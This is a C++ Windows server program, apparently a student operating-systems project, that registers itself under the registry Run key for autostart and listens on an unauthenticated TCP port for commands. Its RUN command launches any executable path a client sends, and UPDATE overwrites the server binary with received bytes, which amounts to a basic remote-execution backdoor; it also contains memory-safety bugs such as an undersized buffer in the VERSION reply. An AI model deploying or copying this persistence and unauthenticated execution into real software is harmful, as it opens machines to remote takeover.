/*
Author: Ron Keinan
ID: 203735857

This code is the server.
at the begining it checks the server app is not already running (with a mutex)
anf if not: writes it to registry so it run in every time the computer starts.
then opens a socket, listens to clients and answers to commands

*/

#undef UNICODE
#define _CRT_SECURE_NO_WARNINGS

#define WIN32_LEAN_AND_MEAN //prevents the Winsock.h from being included by the Windows.h header

#include <windows.h>  //winAPI funcs
#include <winsock2.h> //contains most of the Winsock functions, structures, and definitions.
#include <ws2tcpip.h> //contains definitions introduced in the WinSock 2 Protocol-Specific Annex document for TCP/IP that includes newer functions and structures used to retrieve IP addresses
#include <stdio.h>    //standard input and output
#include <stdlib.h > //standart c funcs
#include <cstdio>
#include <string>

// Need to link with Ws2_32.lib = Winsock Library file
#pragma comment (lib, "Ws2_32.lib") 

#define REG_PATH (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" //path to registry
#define NAME_IN_REG (LPCSTR)"RonApp" //Name in the registry for autorun the app
#define MUTEX_NAME "RonMutexForServer" //name of mutex - to run application only one time in the server

#define DEFAULT_BUFLEN 512  //size of buffer for sending and receiving
#define DEFAULT_PORT "2000" //server and client must connect to the same port number
#define VERSION_NUMBER "1.0"
#define MAX_FILE_SIZE 10000000 //10MB - max of file received


using namespace std;


/// <summary>
/// Function that writes the current code to registry - so that it runs every time the computers turned on.
/// the func doeswnt check if already writen in registry - and writes it anyway - it causes no harm.
/// </summary>
void writeToRegistry()
{
	HANDLE hMyMutex = CreateMutexA(								//handle to name mutex. if not exist it is created, and if does then just habdle
		NULL,						// default security attributes 
		FALSE,						// initially not owned 
		MUTEX_NAME);				// named mutex

	DWORD waitResult = WaitForSingleObject(hMyMutex, 5000);		//try to get the mutex for 5 seconds

	if (waitResult == WAIT_OBJECT_0)							//mutex is available
	{

		LPSTR thisExePath[MAX_PATH];
		GetModuleFileNameA
		(			//path for the file that contains the specified module.
			NULL,					//NULL==get module for current proccess	
			(LPSTR)thisExePath,		//WHERE TO WRITE THE PATH
			MAX_PATH				//size in chars
		);

		HKEY hkey = NULL;
		auto regCheck = RegCreateKeyExA(//Creates a key in registry. if exist - opens it   
			HKEY_CURRENT_USER,			//handle to open registry key
			REG_PATH,					//name of subkey
			0,							//must be 0
			NULL,						//class type of key
			REG_OPTION_NON_VOLATILE,	//default for options
			KEY_ALL_ACCESS,				//access rights
			NULL,						//can't be inherited
			&hkey,						//target for handle
			NULL);						// no disposition information is returned.

		if (regCheck != ERROR_SUCCESS) //last func faild
		{
			printf("Failed to access to registry!\n");
		}


		regCheck = RegSetValueExA(				//set value in registry key			
			hkey,								//handle to reg key
			NAME_IN_REG,						//name of the value to be set
			0,									//must be 0	
			REG_SZ,								//type = string
			(BYTE*)thisExePath,					//data to be stored
			strlen((const char*)thisExePath));	//size of data

		if (regCheck != ERROR_SUCCESS) //last func faild
		{
			printf("Failed to access to registry!\n");
		}

		RegCloseKey(hkey);						//close handle to registrtry

		/*
		MessageBoxA(0,												//handle to owner
			"Final Project in OS Server is now running on your computer!", //text to display
			"Attention",											//box title, default = error
			MB_OK);
			//has only OK button
			*/

		printf("Final Project in OS Server is now running on your computer!\n\n");

		ReleaseMutex(hMyMutex);
	}
	else			//Mutex is catched - program is already running
	{
		printf("Mutex not available! Final Project in OS already running!\n");
	}

	CloseHandle(hMyMutex);

}


/// <summary>
/// compare strings until current size - kind of strncmp.
/// (strncmp didn't work for what i wanted)
/// </summary>
/// <param name="first">first string</param>
/// <param name="second">second string</param>
/// <param name="size">amount of chars to compare</param>
/// <returns>true if equal</returns>
bool compareSTR(const char* first, const char* second, int size)
{
	for (int i = 0; i < size; i++)
	{
		if (first[i] != second[i])
		{
			return false;
		}
	}
	return true;
}

/// <summary>
/// function that receive a string of path to exe file and runs it in a new proccess
/// </summary>
/// <param name="str">path to exe file</param>
void runExeInProccess(CHAR path[])
{
	STARTUPINFOA si; //gui size
	PROCESS_INFORMATION pi; //proccess information

	//ipus of them: (operating system will fill them during running)
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Start the process 
	CreateProcessA
	(
		NULL,
		(LPSTR)path, // Command line 
		NULL, // Process handle not inheritable 
		NULL, // Thread handle not inheritable 
		FALSE, // Set handle inheritance to FALSE 
		0, // No creation flags 
		NULL, // Use parent's environment block 
		NULL, // Use parent's starting directory 
		&si, // Pointer to STARTUPINFO structure 
		&pi); // Pointer to PROCESS_INFORMATION structure 

//wait for process to finish - if written then client can't continue until server close the application
//	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

/// <summary>
/// receive an updated version of the server code and save in current place.
/// </summary>
/// <param name="sockfd">opened socket</param>
void get_file(int sockfd)
{
	char* buffer;
	buffer = new char[MAX_FILE_SIZE]; //will write message to this buffer

	int check = recv(sockfd, buffer, MAX_FILE_SIZE, NULL); //receieve the exe file from client
	if (check < 0)
	{
		printf("Error uploading file");
	}

	string x =  "oldVersionOfServer_" + (string)VERSION_NUMBER + ".exe"; //name of old version file
	
	int checkRename = rename("Server.exe", (const char*)x.c_str()); //change name of current running file - in order to replace
	if (checkRename == 0)
	{
		FILE* File;
		File = fopen("Server.exe", "wb"); //open new file with the original name of this running program
		fwrite((const char*)buffer, 1, check, File);
		fclose(File);
	}
	else
	{
		printf("Error uploading file");
	}
}

/// <summary>
/// This function establishes the connection to the server socket
/// </summary>
/// <param name="iResult">counter for checking</param>
/// <param name="ListenSocket">socket to be connected to</param>
void connectionEstablishment(SOCKET& ListenSocket)
{
	int iResult;

	struct addrinfo* result = NULL, //addrinfo struct hold host address information
		* ptr = NULL,
		hints;

	//set the socket type to be a stream socket for the TCP protocol
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;     //specify the IPv4  address family
	hints.ai_socktype = SOCK_STREAM; //specify a stream socket
	hints.ai_protocol = IPPROTO_TCP; //specify the TCP protocol
	hints.ai_flags = AI_PASSIVE; //flag indicates the caller intends to use the returned socket address structure in a call to the bind function


	 // Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result); //func that get IP according to server name
	if (iResult != 0) //check for errors
	{
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return;
	}


	//find the first IP address returnes from call to getaddrinfo
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) //Check for errors to ensure that the socket is a valid socket
	{
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return;
	}


	//For the server to accept client connections, need to bind a socket that has already been created to an IP address and port
	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) //check for errors
	{
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return;
	}

	freeaddrinfo(result); //he address information returned by the getaddrinfo function is no longer needed

}


/// <summary>
/// This func recieves a socket and listens to it untik a new connection arrives
/// </summary>
/// <param name="ListenSocket">socket to be listened</param>
/// <param name="ClientSocket">a socket that arrived and accepted</param>
void listenConnection(SOCKET& ListenSocket, SOCKET& ClientSocket)
{
	int iResult;

	iResult = listen(ListenSocket, SOMAXCONN); //listen on socket, with maximum reasonable number of pending connections in the queue
	if (iResult == SOCKET_ERROR) //check for errors
	{
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return;
	}

	// Accept a client socket

	ClientSocket = accept(ListenSocket, NULL, NULL); //listen to single socket connection
	if (ClientSocket == INVALID_SOCKET) //check for errors
	{
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return;
	}

	// No longer need server socket
	closesocket(ListenSocket);
}


/// <summary>
/// A function that receives a connected socket and recives a command from it, and responses to the command 
/// </summary>
/// <param name="ClientSocket">connectes socket of client</param>
bool receiveAndSendData(SOCKET& ClientSocket)
{
	int iResult;
	int iSendResult;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	const char* ansbuf;

	// Receive until the peer shuts down the connection - return false
	iResult = recv(ClientSocket, recvbuf, recvbuflen, 0); //return nuber of bytes received
	if (iResult > 0)
	{
		printf("String received: %.*s", iResult, recvbuf);

		// Echo the buffer back to the sender
		if (compareSTR("PING", recvbuf, strlen("PING")) == true)
		{
			ansbuf = "PONG"; //return pong
		}
		else if (compareSTR("RUN", recvbuf, strlen("RUN")) == true) //try RUN C:\Windows\System32\notepad.exe
		{
			CHAR* send = (CHAR*)strncpy(recvbuf, recvbuf + 4, iResult - 4);//copy only the path to application
			send = (CHAR*)strtok(send, "\n"); //erase the \n in end of path
			runExeInProccess(send); //send to func that open a new proccess to activate the application
			ansbuf = "exe file activated in the server!";
		}
		else if (compareSTR("UPDATE", recvbuf, strlen("UPDATE")) == true)
		{
			get_file(ClientSocket);
			ansbuf = "Version updated";
		}
		else if (compareSTR("VERSION", recvbuf, strlen("VERSION")) == true)
		{
			const char* ans = "The server application version is: ";
			PCHAR param = (PCHAR)malloc((strlen(ans) + 1) * sizeof(CHAR));
			sprintf_s(param, DEFAULT_BUFLEN, "%s %s", ans, VERSION_NUMBER); //create string with text and version number
			ansbuf = param;
		}
		else if (compareSTR("EXIT", recvbuf, strlen("EXIT")) == true)
		{
			ansbuf = "BYE BYE";
			return false;
		}
		else
		{
			ansbuf = "Unknown command!";
		}

		iSendResult = send(ClientSocket, ansbuf, strlen(ansbuf), 0); //return number of bytes sent
		if (iSendResult == SOCKET_ERROR)
		{
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
			return false;
		}
		printf("String sent: %.*s\n\n", iSendResult, ansbuf);
	}
	else
	{
		printf("recv failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup(); //terminates use of the Winsock 2 DLL (Ws2_32.dll)
		return false;
	}
	return true;
}

/// <summary>
/// this function disconnects the server from socket - after sending all data
/// </summary>
/// <param name="ClientSocket">socket to disconnect</param>
void disconnectServer(SOCKET& ClientSocket)
{
	int iResult;

	// shutdown the send half of the connection since no more data will be sent
	iResult = shutdown(ClientSocket, SD_SEND); //close socket and release resources, but can still receive data
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return;
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();

}

int main()
{

	writeToRegistry();

	int iResult;
	WSADATA wsaData; //structure contains information about the Windows Sockets implementation.

// Initialize Winsock = initialize the use of the Windows Sockets DLL before making other Winsock functions calls
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); //called to initiate use of WS2_32.dll, version 2.2.
	if (iResult != 0)  //check success of loading winsock DLL
	{
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	SOCKET ListenSocket = INVALID_SOCKET; 	//socket for the server to listen for client connections to the server:
	connectionEstablishment(ListenSocket); //connection establishment

	SOCKET ClientSocket = INVALID_SOCKET; //client connected to the socket
	listenConnection(ListenSocket, ClientSocket); //listen to incoming connection request in the bounded socket

	bool flag = false; //check if receive data wad valid
	do
	{
		flag = receiveAndSendData(ClientSocket); //receive and send data
	} while (flag == true);

	disconnectServer(ClientSocket); //disconnect the server

	system("pause");
	return 0;
}


